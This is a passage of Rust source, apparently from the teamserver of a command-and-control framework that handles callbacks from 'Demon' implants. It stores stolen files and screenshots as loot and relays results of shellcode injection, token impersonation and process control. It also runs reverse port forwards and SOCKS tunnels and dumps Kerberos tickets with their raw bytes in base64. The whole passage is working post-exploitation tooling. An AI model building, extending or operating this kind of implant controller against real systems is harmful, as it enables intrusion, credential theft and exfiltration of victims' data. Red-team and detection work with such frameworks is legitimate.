                u32::from(DemonCommand::CommandFs),
                request_id,
                "Info",
                &format!("Current directory: {path}"),
                None,
            )?);
        }
        DemonFilesystemCommand::Cat => {
            let path = parser.read_utf16("filesystem cat path")?;
            let success = parser.read_bool("filesystem cat success")?;
            let output = parser.read_string("filesystem cat output")?;
            let (kind, message) = if success {
                ("Info", format!("File content of {path} ({}):", output.len()))
            } else {
                ("Erro", format!("Failed to read file: {path}"))
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandFs),
                request_id,
                kind,
                &message,
                if success { Some(output) } else { None },
            )?);
        }
    }

    Ok(None)
}

fn parse_file_open_header(
    command_id: u32,
    bytes: &[u8],
) -> Result<(u32, u64, String), CommandDispatchError> {
    if bytes.len() < 8 {
        return Err(CommandDispatchError::InvalidCallbackPayload {
            command_id,
            message: format!("file open payload: expected at least 8 bytes, got {}", bytes.len()),
        });
    }
    let file_id = u32::from_be_bytes(bytes[0..4].try_into().map_err(|_| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id,
            message: "file id parse failure".to_owned(),
        }
    })?);
    let expected_size = u64::from(u32::from_be_bytes(bytes[4..8].try_into().map_err(|_| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id,
            message: "file size parse failure".to_owned(),
        }
    })?));
    let path = String::from_utf8_lossy(&bytes[8..]).trim_end_matches('\0').to_owned();
    Ok((file_id, expected_size, path))
}

fn parse_file_chunk(command_id: u32, bytes: &[u8]) -> Result<(u32, Vec<u8>), CommandDispatchError> {
    if bytes.len() < 4 {
        return Err(CommandDispatchError::InvalidCallbackPayload {
            command_id,
            message: format!("file chunk payload: expected at least 4 bytes, got {}", bytes.len()),
        });
    }
    let file_id = u32::from_be_bytes(bytes[0..4].try_into().map_err(|_| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id,
            message: "file id parse failure".to_owned(),
        }
    })?);
    Ok((file_id, bytes[4..].to_vec()))
}

fn parse_file_close(command_id: u32, bytes: &[u8]) -> Result<u32, CommandDispatchError> {
    if bytes.len() < 4 {
        return Err(CommandDispatchError::InvalidCallbackPayload {
            command_id,
            message: format!("file close payload: expected 4 bytes, got {}", bytes.len()),
        });
    }
    let file_id = u32::from_be_bytes(bytes[0..4].try_into().map_err(|_| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id,
            message: "file close parse failure".to_owned(),
        }
    })?);
    Ok(file_id)
}

async fn persist_download(
    database: &Database,
    agent_id: u32,
    file_id: u32,
    state: &DownloadState,
) -> Result<(), CommandDispatchError> {
    let name = state
        .remote_path
        .replace('\\', "/")
        .rsplit('/')
        .next()
        .unwrap_or(state.remote_path.as_str())
        .trim_end_matches('\0')
        .to_owned();
    database
        .loot()
        .create(&LootRecord {
            id: None,
            agent_id,
            kind: "download".to_owned(),
            name,
            file_path: Some(state.remote_path.clone()),
            size_bytes: Some(i64::try_from(state.data.len()).unwrap_or_default()),
            captured_at: OffsetDateTime::now_utc().format(&Rfc3339)?,
            data: Some(state.data.clone()),
            metadata: Some(Value::Object(
                [
                    ("file_id".to_owned(), Value::String(format!("{file_id:08X}"))),
                    ("request_id".to_owned(), Value::String(format!("{:X}", state.request_id))),
                    ("expected_size".to_owned(), Value::String(state.expected_size.to_string())),
                    ("started_at".to_owned(), Value::String(state.started_at.clone())),
                ]
                .into_iter()
                .collect(),
            )),
        })
        .await?;
    Ok(())
}

fn download_progress_event(
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    file_id: u32,
    remote_path: &str,
    current_size: u64,
    expected_size: u64,
    state: &str,
) -> Result<OperatorMessage, CommandDispatchError> {
    let message = format!(
        "{state} download of file: {remote_path} [{}/{}]",
        byte_count(current_size),
        byte_count(expected_size)
    );
    agent_response_event_with_extra(
        agent_id,
        command_id,
        request_id,
        "Info",
        &message,
        BTreeMap::from([
            ("MiscType".to_owned(), Value::String("download-progress".to_owned())),
            ("FileID".to_owned(), Value::String(format!("{file_id:08X}"))),
            ("FileName".to_owned(), Value::String(remote_path.to_owned())),
            ("CurrentSize".to_owned(), Value::String(current_size.to_string())),
            ("ExpectedSize".to_owned(), Value::String(expected_size.to_string())),
            ("State".to_owned(), Value::String(state.to_owned())),
        ]),
        String::new(),
    )
}

fn download_complete_event(
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    file_id: u32,
    state: &DownloadState,
) -> Result<OperatorMessage, CommandDispatchError> {
    agent_response_event_with_extra(
        agent_id,
        command_id,
        request_id,
        "Good",
        &format!("Finished download of file: {}", state.remote_path),
        BTreeMap::from([
            ("MiscType".to_owned(), Value::String("download".to_owned())),
            ("FileID".to_owned(), Value::String(format!("{file_id:08X}"))),
            ("FileName".to_owned(), Value::String(state.remote_path.clone())),
            ("MiscData".to_owned(), Value::String(BASE64_STANDARD.encode(&state.data))),
            (
                "MiscData2".to_owned(),
                Value::String(format!(
                    "{};{}",
                    BASE64_STANDARD.encode(state.remote_path.as_bytes()),
                    byte_count(u64::try_from(state.data.len()).unwrap_or_default())
                )),
            ),
        ]),
        String::new(),
    )
}

fn byte_count(size: u64) -> String {
    const UNITS: [&str; 5] = ["B", "kB", "MB", "GB", "TB"];
    let mut value = size as f64;
    let mut unit = 0usize;
    while value >= 1000.0 && unit < UNITS.len() - 1 {
        value /= 1000.0;
        unit += 1;
    }
    if unit == 0 {
        format!("{size} {}", UNITS[unit])
    } else {
        format!("{value:.2} {}", UNITS[unit])
    }
}

async fn handle_process_list_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandProcList));
    let _from_process_manager = parser.read_u32("process ui flag")?;
    let mut rows = Vec::new();

    while !parser.is_empty() {
        let name = parser.read_utf16("process name")?;
        let pid = parser.read_u32("process pid")?;
        let is_wow = parser.read_u32("process wow64")?;
        let ppid = parser.read_u32("process ppid")?;
        let session = parser.read_u32("process session")?;
        let threads = parser.read_u32("process threads")?;
        let user = parser.read_utf16("process user")?;
        let arch = if is_wow == 0 { "x64" } else { "x86" };
        rows.push(ProcessRow { name, pid, ppid, session, arch: arch.to_owned(), threads, user });
    }

    let output = format_process_table(&rows);
    if output.is_empty() {
        return Ok(None);
    }

    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::CommandProcList),
        request_id,
        "Info",
        "Process List:",
        Some(output),
    )?);
    Ok(None)
}

async fn handle_process_command_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandProc));
    let subcommand = parser.read_u32("process subcommand")?;

    match DemonProcessCommand::try_from(subcommand).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandProc),
            message: error.to_string(),
        }
    })? {
        DemonProcessCommand::Create => {
            let path = parser.read_utf16("process path")?;
            let pid = parser.read_u32("process pid")?;
            let success = parser.read_u32("process create success")?;
            let piped = parser.read_u32("process create piped")?;
            let verbose = parser.read_u32("process create verbose")?;

            if verbose != 0 {
                let (kind, message) = if success != 0 {
                    ("Info", format!("Process started: Path:[{path}] ProcessID:[{pid}]"))
                } else {
                    ("Error", format!("Process could not be started: Path:[{path}]"))
                };
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::CommandProc),
                    request_id,
                    kind,
                    &message,
                    None,
                )?);
            } else if success == 0 || piped == 0 {
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::CommandProc),
                    request_id,
                    "Info",
                    "Process create completed",
                    None,
                )?);
            }
        }
        DemonProcessCommand::Kill => {
            let success = parser.read_u32("process kill success")?;
            let pid = parser.read_u32("process kill pid")?;
            let (kind, message) = if success != 0 {
                ("Good", format!("Successful killed process: {pid}"))
            } else {
                ("Error", "Failed to kill process".to_owned())
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandProc),
                request_id,
                kind,
                &message,
                None,
            )?);
        }
        other => {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::CommandProc),
                message: format!("unsupported process callback subcommand {other:?}"),
            });
        }
    }

    Ok(None)
}

async fn handle_inject_shellcode_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandInjectShellcode));
    let status = parser.read_u32("shellcode inject status")?;
    let (kind, message) = match status {
        x if x == u32::from(DemonInjectError::Success) => ("Good", "Successful injected shellcode"),
        x if x == u32::from(DemonInjectError::Failed) => ("Error", "Failed to inject shellcode"),
        x if x == u32::from(DemonInjectError::InvalidParam) => {
            ("Error", "Invalid parameter specified")
        }
        x if x == u32::from(DemonInjectError::ProcessArchMismatch) => {
            ("Error", "Process architecture mismatch")
        }
        other => {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::CommandInjectShellcode),
                message: format!("unknown shellcode injection status {other}"),
            });
        }
    };

    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::CommandInjectShellcode),
        request_id,
        kind,
        message,
        None,
    )?);
    Ok(None)
}

async fn handle_token_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandToken));
    let subcommand = parser.read_u32("token subcommand")?;

    match DemonTokenCommand::try_from(subcommand).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandToken),
            message: error.to_string(),
        }
    })? {
        DemonTokenCommand::Impersonate => {
            let success = parser.read_u32("token impersonation success")?;
            let user = parser.read_string("token impersonation user")?;
            let (kind, message) = if success != 0 {
                ("Good", format!("Successful impersonated {user}"))
            } else {
                ("Error", format!("Failed to impersonat {user}"))
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandToken),
                request_id,
                kind,
                &message,
                None,
            )?);
        }
        other => {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::CommandToken),
                message: format!("unsupported token callback subcommand {other:?}"),
            });
        }
    }

    Ok(None)
}

async fn handle_screenshot_callback(
    database: &Database,
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandScreenshot));
    let success = parser.read_u32("screenshot success")?;

    if success == 0 {
        events.broadcast(agent_response_event(
            agent_id,
            u32::from(DemonCommand::CommandScreenshot),
            request_id,
            "Error",
            "Failed to take a screenshot",
            None,
        )?);
        return Ok(None);
    }

    let bytes = parser.read_bytes("screenshot bytes")?;
    if bytes.is_empty() {
        events.broadcast(agent_response_event(
            agent_id,
            u32::from(DemonCommand::CommandScreenshot),
            request_id,
            "Error",
            "Failed to take a screenshot",
            None,
        )?);
        return Ok(None);
    }

    let timestamp = OffsetDateTime::now_utc();
    let captured_at = timestamp.format(&Rfc3339)?;
    let name = timestamp
        .format(
            &time::format_description::parse(
                "Desktop_[day].[month].[year]-[hour].[minute].[second].png",
            )
            .map_err(|error| CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::CommandScreenshot),
                message: error.to_string(),
            })?,
        )
        .map_err(CommandDispatchError::Timestamp)?;

    database
        .loot()
        .create(&LootRecord {
            id: None,
            agent_id,
            kind: "screenshot".to_owned(),
            name: name.clone(),
            file_path: None,
            size_bytes: Some(i64::try_from(bytes.len()).unwrap_or_default()),
            captured_at: captured_at.clone(),
            data: Some(bytes.clone()),
            metadata: Some(Value::Object(
                [
                    ("request_id".to_owned(), Value::String(format!("{request_id:X}"))),
                    ("captured_at".to_owned(), Value::String(captured_at.clone())),
                ]
                .into_iter()
                .collect(),
            )),
        })
        .await?;

    events.broadcast(agent_response_event_with_extra(
        agent_id,
        u32::from(DemonCommand::CommandScreenshot),
        request_id,
        "Good",
        "Successful took screenshot",
        BTreeMap::from([
            ("MiscType".to_owned(), Value::String("screenshot".to_owned())),
            ("MiscData".to_owned(), Value::String(BASE64_STANDARD.encode(&bytes))),
            ("MiscData2".to_owned(), Value::String(name)),
        ]),
        String::new(),
    )?);
    Ok(None)
}

async fn handle_kerberos_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandKerberos));
    let subcommand = parser.read_u32("kerberos subcommand")?;

    match DemonKerberosCommand::try_from(subcommand).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandKerberos),
            message: error.to_string(),
        }
    })? {
        DemonKerberosCommand::Luid => {
            let success = parser.read_u32("kerberos luid success")?;
            if success == 0 {
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::CommandKerberos),
                    request_id,
                    "Erro",
                    "Failed to obtain the current logon ID",
                    None,
                )?);
                return Ok(None);
            }

            let high = parser.read_u32("kerberos luid high part")?;
            let low = parser.read_u32("kerberos luid low part")?;
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandKerberos),
                request_id,
                "Good",
                &format!("Current LogonId: {high:x}:0x{low:x}"),
                None,
            )?);
        }
        DemonKerberosCommand::Klist => {
            let success = parser.read_u32("kerberos klist success")?;
            if success == 0 {
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::CommandKerberos),
                    request_id,
                    "Erro",
                    "Failed to list all kerberos tickets",
                    None,
                )?);
                return Ok(None);
            }

            let output = format_kerberos_klist(&mut parser)?;
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandKerberos),
                request_id,
                "Info",
                "Kerberos tickets:",
                Some(output),
            )?);
        }
        DemonKerberosCommand::Purge => {
            let success = parser.read_u32("kerberos purge success")?;
            let (kind, message) = if success != 0 {
                ("Good", "Successfully purged the Kerberos ticket")
            } else {
                ("Erro", "Failed to purge the kerberos ticket")
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandKerberos),
                request_id,
                kind,
                message,
                None,
            )?);
        }
        DemonKerberosCommand::Ptt => {
            let success = parser.read_u32("kerberos ptt success")?;
            let (kind, message) = if success != 0 {
                ("Good", "Successfully imported the Kerberos ticket")
            } else {
                ("Erro", "Failed to import the kerberos ticket")
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandKerberos),
                request_id,
                kind,
                message,
                None,
            )?);
        }
    }

    Ok(None)
}

async fn handle_socket_callback(
    events: &EventBus,
    sockets: &SocketRelayManager,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandSocket));
    let subcommand = parser.read_u32("socket subcommand")?;

    match DemonSocketCommand::try_from(subcommand).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandSocket),
            message: error.to_string(),
        }
    })? {
        DemonSocketCommand::ReversePortForwardAdd => {
            let success = parser.read_u32("rportfwd add success")?;
            let socket_id = parser.read_u32("rportfwd add socket id")?;
            let local_addr = int_to_ipv4(parser.read_u32("rportfwd add local addr")?);
            let local_port = parser.read_u32("rportfwd add local port")?;
            let forward_addr = int_to_ipv4(parser.read_u32("rportfwd add forward addr")?);
            let forward_port = parser.read_u32("rportfwd add forward port")?;
            let (kind, message) = if success != 0 {
                (
                    "Info",
                    format!(
                        "Started reverse port forward on {local_addr}:{local_port} to {forward_addr}:{forward_port} [Id: {socket_id:x}]"
                    ),
                )
            } else {
                (
                    "Erro",
                    format!(
                        "Failed to start reverse port forward on {local_addr}:{local_port} to {forward_addr}:{forward_port}"
                    ),
                )
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandSocket),
                request_id,
                kind,
                &message,
                None,
            )?);
        }
        DemonSocketCommand::ReversePortForwardList => {
            let output = format_rportfwd_list(&mut parser)?;
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandSocket),
                request_id,
                "Info",
                "reverse port forwards:",
                Some(output),
            )?);
        }
        DemonSocketCommand::ReversePortForwardRemove => {
            let socket_id = parser.read_u32("rportfwd remove socket id")?;
            let socket_type = parser.read_u32("rportfwd remove type")?;
            let local_addr = int_to_ipv4(parser.read_u32("rportfwd remove local addr")?);
            let local_port = parser.read_u32("rportfwd remove local port")?;
            let forward_addr = int_to_ipv4(parser.read_u32("rportfwd remove forward addr")?);
            let forward_port = parser.read_u32("rportfwd remove forward port")?;
            if socket_type == u32::from(DemonSocketType::ReversePortForward) {
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::CommandSocket),
                    request_id,
                    "Info",
                    &format!(
                        "Successful closed and removed rportfwd [SocketID: {socket_id:x}] [Forward: {local_addr}:{local_port} -> {forward_addr}:{forward_port}]"
                    ),
                    None,
                )?);
            }
        }
        DemonSocketCommand::ReversePortForwardClear => {
            let success = parser.read_u32("rportfwd clear success")?;
            let (kind, message) = if success != 0 {
                ("Good", "Successful closed and removed all rportfwds")
            } else {
                ("Erro", "Failed to closed and remove all rportfwds")
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandSocket),
                request_id,
                kind,
                message,
                None,
            )?);
        }
        DemonSocketCommand::Read => {
            let socket_id = parser.read_u32("socket read socket id")?;
            let socket_type = parser.read_u32("socket read type")?;
            let success = parser.read_u32("socket read success")?;
            if success == 0 {
                let error_code = parser.read_u32("socket read error code")?;
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::CommandSocket),
                    request_id,
                    "Erro",
                    &format!("Failed to read from socks target {socket_id}: {error_code}"),
                    None,
                )?);
                return Ok(None);
            }

            let data = parser.read_bytes("socket read data")?;
            if socket_type == u32::from(DemonSocketType::ReverseProxy) {
                let _ = sockets.write_client_data(agent_id, socket_id, &data).await;
            }
        }
        DemonSocketCommand::Write => {
            let socket_id = parser.read_u32("socket write socket id")?;
            let _socket_type = parser.read_u32("socket write type")?;
            let success = parser.read_u32("socket write success")?;
            if success == 0 {
                let error_code = parser.read_u32("socket write error code")?;
                events.broadcast(agent_response_event(
                    agent_id,
                    u32::from(DemonCommand::CommandSocket),
                    request_id,
                    "Erro",
                    &format!("Failed to write to socks target {socket_id}: {error_code}"),
                    None,
                )?);
            }
        }
        DemonSocketCommand::Close => {
            let socket_id = parser.read_u32("socket close socket id")?;
            let socket_type = parser.read_u32("socket close type")?;
            if socket_type == u32::from(DemonSocketType::ReverseProxy) {
                let _ = sockets.close_client(agent_id, socket_id).await;
            }
        }
        DemonSocketCommand::Connect => {
            let success = parser.read_u32("socket connect success")?;
            let socket_id = parser.read_u32("socket connect socket id")?;
            let error_code = parser.read_u32("socket connect error code")?;
            let _ = sockets.finish_connect(agent_id, socket_id, success != 0, error_code).await;
        }
        DemonSocketCommand::SocksProxyAdd
        | DemonSocketCommand::Open
        | DemonSocketCommand::SocksProxyList
        | DemonSocketCommand::SocksProxyRemove
        | DemonSocketCommand::SocksProxyClear
        | DemonSocketCommand::ReversePortForwardAddLocal => {}
    }

    Ok(None)
}

fn decode_fixed<const N: usize>(
    agent_id: u32,
    field: &'static str,
    encoded: &[u8],
) -> Result<[u8; N], CommandDispatchError> {
    let decoded = BASE64_STANDARD.decode(encoded).map_err(|error| {
        CommandDispatchError::InvalidStoredCryptoEncoding {
            agent_id,
            field,
            message: error.to_string(),
        }
    })?;

    let actual = decoded.len();
    decoded.try_into().map_err(|_| CommandDispatchError::InvalidStoredCryptoLength {
        agent_id,
        field,
        expected: N,
        actual,
    })
}

fn agent_new_event(
    listener_name: &str,
    magic_value: u32,
    agent: &red_cell_common::AgentInfo,
    pivots: &PivotInfo,
) -> OperatorMessage {
    OperatorMessage::AgentNew(Box::new(Message {
        head: MessageHead {
            event: EventCode::Session,
            user: "teamserver".to_owned(),
            timestamp: agent.last_call_in.clone(),
            one_time: "true".to_owned(),
        },
        info: operator_agent_info(listener_name, magic_value, agent, pivots),
    }))
}

fn agent_update_event(agent: &red_cell_common::AgentInfo) -> OperatorMessage {
    OperatorMessage::AgentUpdate(Message {
        head: MessageHead {
            event: EventCode::Session,
            user: "teamserver".to_owned(),
            timestamp: agent.last_call_in.clone(),
            one_time: String::new(),
        },
        info: AgentUpdateInfo { agent_id: agent.name_id(), marked: "Alive".to_owned() },
    })
}

fn operator_agent_info(
    listener_name: &str,
    magic_value: u32,
    agent: &red_cell_common::AgentInfo,
    pivots: &PivotInfo,
) -> OperatorAgentInfo {
    let parent = pivots.parent.map(|agent_id| format!("{agent_id:08X}"));
    let links = pivots.children.iter().map(|agent_id| format!("{agent_id:08X}")).collect();

    OperatorAgentInfo {
        active: agent.active.to_string(),
        background_check: false,
        domain_name: agent.domain_name.clone(),
        elevated: agent.elevated,
        encryption: OperatorAgentEncryptionInfo {
            aes_key: agent.encryption.aes_key.clone(),
            aes_iv: agent.encryption.aes_iv.clone(),
        },
        internal_ip: agent.internal_ip.clone(),
        external_ip: agent.external_ip.clone(),
        first_call_in: agent.first_call_in.clone(),
        last_call_in: agent.last_call_in.clone(),
        hostname: agent.hostname.clone(),
        listener: listener_name.to_owned(),
        magic_value: format!("{magic_value:08x}"),
        name_id: agent.name_id(),
        os_arch: agent.os_arch.clone(),
        os_build: String::new(),
        os_version: agent.os_version.clone(),
        pivots: AgentPivotsInfo { parent: parent.clone(), links },
        port_fwds: Vec::new(),
        process_arch: agent.process_arch.clone(),
        process_name: agent.process_name.clone(),
        process_pid: agent.process_pid.to_string(),
        process_ppid: agent.process_ppid.to_string(),
        process_path: agent.process_name.clone(),
        reason: agent.reason.clone(),
        note: agent.note.clone(),
        sleep_delay: Value::from(agent.sleep_delay),
        sleep_jitter: Value::from(agent.sleep_jitter),
        kill_date: agent.kill_date.map_or(Value::Null, Value::from),
        working_hours: agent.working_hours.map_or(Value::Null, Value::from),
        socks_cli: Vec::new(),
        socks_cli_mtx: None,
        socks_svr: Vec::new(),
        tasked_once: false,
        username: agent.username.clone(),
        pivot_parent: parent.unwrap_or_default(),
    }
}

fn agent_response_event(
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    kind: &str,
    message: &str,
    output: Option<String>,
) -> Result<OperatorMessage, CommandDispatchError> {
    agent_response_event_with_extra(
        agent_id,
        command_id,
        request_id,
        kind,
        message,
        BTreeMap::new(),
        output.unwrap_or_default(),
    )
}

fn agent_response_event_with_extra(
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    kind: &str,
    message: &str,
    mut extra: BTreeMap<String, Value>,
    output: String,
) -> Result<OperatorMessage, CommandDispatchError> {
    let timestamp = OffsetDateTime::now_utc().format(&Rfc3339)?;
    extra.insert("Type".to_owned(), Value::String(kind.to_owned()));
    extra.insert("Message".to_owned(), Value::String(message.to_owned()));
    extra.insert("RequestID".to_owned(), Value::String(format!("{request_id:X}")));

    Ok(OperatorMessage::AgentResponse(Message {
        head: MessageHead {
            event: EventCode::Session,
            user: "teamserver".to_owned(),
            timestamp,
            one_time: String::new(),
        },
        info: AgentResponseInfo {
            demon_id: format!("{agent_id:08X}"),
            command_id: command_id.to_string(),
            output,
            command_line: None,
            extra,
        },
    }))
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ProcessRow {
    name: String,
    pid: u32,
    ppid: u32,
    session: u32,
    arch: String,
    threads: u32,
    user: String,
}

fn format_process_table(rows: &[ProcessRow]) -> String {
    if rows.is_empty() {
        return String::new();
    }

    let name_width = rows.iter().map(|row| row.name.len()).max().unwrap_or(4).max(4);
    let mut output = String::new();
    output.push_str(&format_process_row(
        name_width, "Name", "PID", "PPID", "Session", "Arch", "Threads", "User",
    ));
    output.push('\n');
    output.push_str(&format_process_row(
        name_width, "----", "---", "----", "-------", "----", "-------", "----",
    ));
    output.push('\n');

    for row in rows {
        output.push_str(&format_process_row(
            name_width,
            &row.name,
            row.pid,
            row.ppid,
            row.session,
            &row.arch,
            row.threads,
            &row.user,
        ));
        output.push('\n');
    }

    output
}

fn format_process_row(
    name_width: usize,
    name: impl std::fmt::Display,
    pid: impl std::fmt::Display,
    ppid: impl std::fmt::Display,
    session: impl std::fmt::Display,
    arch: impl std::fmt::Display,
    threads: impl std::fmt::Display,
    user: impl std::fmt::Display,
) -> String {
    format!(
        " {name:<name_width$}   {pid:<4}   {ppid:<4}   {session:<7}   {arch:<5}   {threads:<7}   {user:<4}",
        name = name,
        pid = pid,
        ppid = ppid,
        session = session,
        arch = arch,
        threads = threads,
        user = user,
        name_width = name_width,
    )
}

fn format_rportfwd_list(parser: &mut CallbackParser<'_>) -> Result<String, CommandDispatchError> {
    let mut output = String::from("\n Socket ID     Forward\n ---------     -------\n");

    while !parser.is_empty() {
        let socket_id = parser.read_u32("rportfwd list socket id")?;
        let local_addr = int_to_ipv4(parser.read_u32("rportfwd list local addr")?);
        let local_port = parser.read_u32("rportfwd list local port")?;
        let forward_addr = int_to_ipv4(parser.read_u32("rportfwd list forward addr")?);
        let forward_port = parser.read_u32("rportfwd list forward port")?;
        output.push_str(&format!(
            " {socket_id:<13x}{local_addr}:{local_port} -> {forward_addr}:{forward_port}\n"
        ));
    }

    Ok(output.trim_end().to_owned())
}

fn format_kerberos_klist(parser: &mut CallbackParser<'_>) -> Result<String, CommandDispatchError> {
    let session_count = parser.read_u32("kerberos session count")?;
    let mut output = String::new();

    for _ in 0..session_count {
        let username = parser.read_utf16("kerberos username")?;
        let domain = parser.read_utf16("kerberos domain")?;
        let logon_id_low = parser.read_u32("kerberos logon id low")?;
        let logon_id_high = parser.read_u32("kerberos logon id high")?;
        let session = parser.read_u32("kerberos session")?;
        let user_sid = parser.read_utf16("kerberos user sid")?;
        let logon_time_low = parser.read_u32("kerberos logon time low")?;
        let logon_time_high = parser.read_u32("kerberos logon time high")?;
        let logon_type = parser.read_u32("kerberos logon type")?;
        let auth_package = parser.read_utf16("kerberos auth package")?;
        let logon_server = parser.read_utf16("kerberos logon server")?;
        let dns_domain = parser.read_utf16("kerberos dns domain")?;
        let upn = parser.read_utf16("kerberos upn")?;
        let ticket_count = parser.read_u32("kerberos ticket count")?;

        output.push_str(&format!("UserName                : {username}\n"));
        output.push_str(&format!("Domain                  : {domain}\n"));
        output
            .push_str(&format!("LogonId                 : {logon_id_high:x}:0x{logon_id_low:x}\n"));
        output.push_str(&format!("Session                 : {session}\n"));
        output.push_str(&format!("UserSID                 : {user_sid}\n"));
        output.push_str(&format!(
            "LogonTime               : {}\n",
            format_filetime(logon_time_high, logon_time_low)
        ));
        output.push_str(&format!("Authentication package  : {auth_package}\n"));
        output.push_str(&format!("LogonType               : {}\n", logon_type_name(logon_type)));
        output.push_str(&format!("LogonServer             : {logon_server}\n"));
        output.push_str(&format!("LogonServerDNSDomain    : {dns_domain}\n"));
        output.push_str(&format!("UserPrincipalName       : {upn}\n"));
        output.push_str(&format!("Cached tickets:         : {ticket_count}\n"));

        for _ in 0..ticket_count {
            let client_name = parser.read_utf16("kerberos ticket client name")?;
            let client_realm = parser.read_utf16("kerberos ticket client realm")?;
            let server_name = parser.read_utf16("kerberos ticket server name")?;
            let server_realm = parser.read_utf16("kerberos ticket server realm")?;
            let start_low = parser.read_u32("kerberos ticket start low")?;
            let start_high = parser.read_u32("kerberos ticket start high")?;
            let end_low = parser.read_u32("kerberos ticket end low")?;
            let end_high = parser.read_u32("kerberos ticket end high")?;
            let renew_low = parser.read_u32("kerberos ticket renew low")?;
            let renew_high = parser.read_u32("kerberos ticket renew high")?;
            let encryption_type = parser.read_u32("kerberos ticket encryption type")?;
            let ticket_flags = parser.read_u32("kerberos ticket flags")?;
            let ticket = parser.read_bytes("kerberos ticket bytes")?;

            output.push('\n');
            output.push_str(&format!("\tClient name     : {client_name} @ {client_realm}\n"));
            output.push_str(&format!("\tServer name     : {server_name} @ {server_realm}\n"));
            output.push_str(&format!(
                "\tStart time      : {}\n",
                format_filetime(start_high, start_low)
            ));
            output
                .push_str(&format!("\tEnd time        : {}\n", format_filetime(end_high, end_low)));
            output.push_str(&format!(
                "\tRewnew time     : {}\n",
                format_filetime(renew_high, renew_low)
            ));
            output.push_str(&format!(
                "\tEncryption type : {}\n",
                kerberos_encryption_type_name(encryption_type)
            ));
            output.push_str(&format!("\tFlags           :{}\n", format_ticket_flags(ticket_flags)));
            if !ticket.is_empty() {
                output
                    .push_str(&format!("\tTicket          : {}\n", BASE64_STANDARD.encode(ticket)));
            }
        }

        output.push('\n');
    }

    Ok(output.trim_end().to_owned())
}

fn format_filetime(high: u32, low: u32) -> String {
    let filetime = ((u64::from(high)) << 32) | u64::from(low);
    if filetime <= 0x019D_B1DE_D53E_8000 {
        return "1970-01-01 00:00:00 +00:00:00".to_owned();
    }

    let unix_seconds = ((filetime - 0x019D_B1DE_D53E_8000) / 10_000_000) as i64;
    OffsetDateTime::from_unix_timestamp(unix_seconds)
        .map(|time| time.to_string())
        .unwrap_or_else(|_| unix_seconds.to_string())
}

fn logon_type_name(value: u32) -> &'static str {
    match value {
        2 => "Interactive",
        3 => "Network",
        4 => "Batch",
        5 => "Service",
        7 => "Unlock",
        8 => "Network_Cleartext",
        9 => "New_Credentials",
        _ => "Unknown",
    }
}

fn kerberos_encryption_type_name(value: u32) -> &'static str {
    match value {
        1 => "DES_CBC_CRC",
        2 => "DES_CBC_MD4",
        3 => "DES_CBC_MD5",
